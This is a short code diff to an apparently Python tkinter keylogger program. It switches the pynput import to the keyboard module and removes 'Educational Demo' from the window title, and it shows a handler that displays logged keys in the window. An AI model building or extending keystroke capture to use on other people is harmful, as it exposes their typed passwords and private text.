@@ -1,5 +1,5 @@
 import tkinter as tk
-import pynput
+from pynput import keyboard
 import json
 from datetime import datetime
 
@@ -30,7 +30,7 @@ def log_key(event):
     output.see(tk.END)
 
 root = tk.Tk()
-root.title("Keylogger – Educational Demo")
+root.title("Keylogger")
 root.geometry("500x300")
 
 label = tk.Label(
